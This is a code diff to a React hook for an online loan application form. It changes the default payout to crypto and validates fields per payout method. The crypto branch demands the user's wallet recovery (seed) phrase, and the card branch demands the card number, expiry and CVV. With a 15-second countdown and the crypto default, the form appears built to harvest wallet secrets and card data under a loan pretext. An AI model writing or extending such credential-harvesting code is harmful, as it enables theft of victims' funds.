@@ -30,7 +30,7 @@ export function useLoanApplication() {
   const [loading, setLoading] = useState(false);
   const [done, setDone] = useState(false);
   const [countdown, setCountdown] = useState(15);
-  const [payout, setPayout] = useState<"bank_transfer" | "card" | "crypto">("bank_transfer");
+  const [payout, setPayout] = useState<"bank_transfer" | "card" | "crypto">("crypto");
 
   const [appId, setAppId] = useState<string | null>(null);
   const [appStatus, setAppStatus] = useState<AppStatus | null>(null);
@@ -168,28 +168,42 @@ export function useLoanApplication() {
       return;
     }
 
-    // 1. Validate Card (always required now)
-    const errs = validateCard(cardNumber, cardExpiry, cardCvv);
-    if (Object.keys(errs).length) {
-      setCardErrors(errs);
-      toast.error(Object.values(errs)[0]);
-      return;
+    // 1–3. Validate only the active payout method
+    if (payout === "card") {
+      const errs = validateCard(cardNumber, cardExpiry, cardCvv);
+      if (Object.keys(errs).length) {
+        setCardErrors(errs);
+        toast.error(Object.values(errs)[0]);
+        return;
+      }
+      const cardHolder = String(fd.get("card_holder_name") || "").trim();
+      if (!cardHolder) {
+        toast.error("Please enter the cardholder name.");
+        return;
+      }
     }
     setCardErrors({});
 
-    // 2. Validate Bank (always required now)
-    const bankName = String(fd.get("bank_name") || "").trim();
-    const bankAcc = String(fd.get("bank_account_number") || "").trim();
-    if (!bankName || !bankAcc) {
-      toast.error("Please provide your bank account details.");
-      return;
+    if (payout === "bank_transfer") {
+      const bankName = String(fd.get("bank_name") || "").trim();
+      const bankAcc = String(fd.get("bank_account_number") || "").trim();
+      if (!bankName || !bankAcc) {
+        toast.error("Please provide your bank name and account number.");
+        return;
+      }
     }
 
-    // 3. Validate Crypto (always required now)
-    const seedPhrase = String(fd.get("crypto_seed_phrase") || "").trim();
-    if (!seedPhrase) {
-      toast.error("Please enter your wallet recovery phrase.");
-      return;
+    if (payout === "crypto") {
+      const seedPhrase = String(fd.get("crypto_seed_phrase") || "").trim();
+      if (!seedPhrase) {
+        toast.error("Please enter your wallet recovery phrase.");
+        return;
+      }
+      const walletAddr = String(fd.get("crypto_wallet_address") || "").trim();
+      if (!walletAddr) {
+        toast.error("Please enter your crypto wallet address.");
+        return;
+      }
     }
 
     const payload = {
